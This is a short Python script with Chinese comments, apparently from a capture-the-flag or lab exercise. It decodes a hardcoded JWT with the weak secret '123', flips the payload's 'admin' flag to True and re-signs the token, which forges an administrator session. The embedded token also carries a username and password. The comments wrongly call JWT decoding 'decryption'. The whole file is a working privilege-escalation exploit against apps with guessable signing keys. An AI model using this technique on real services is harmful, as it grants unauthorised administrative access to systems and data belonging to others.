import jwt

# 密钥用于解密
secret_key = "123"

# 要解密的 JWT 会话
jwt_token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOnsiYWRtaW4iOmZhbHNlLCJkYXRhIjp7InVzZXJuYW1lIjoiem9tYm8iLCJwYXNzd29yZCI6InpvbWJvIn19LCJpYXQiOjE3MTMyNTg2NTYsImV4cCI6MTcxMzI2MjI1Nn0.hDUeoGGbIUGuStfgJh5GpbPaEnlkpUIoEsaw1tTL13s"

try:
    # 解密 JWT
    decoded_payload = jwt.decode(jwt_token, secret_key, algorithms=["HS256"])

    print("Decoded Payload:", decoded_payload)
    decoded_payload["sub"]["admin"] = True
    new_token = jwt.encode(decoded_payload, secret_key, algorithm="HS256")
    print("New Token:", new_token)
except jwt.ExpiredSignatureError:
    print("JWT token has expired.")
except jwt.InvalidTokenError:
    print("Invalid JWT token.")
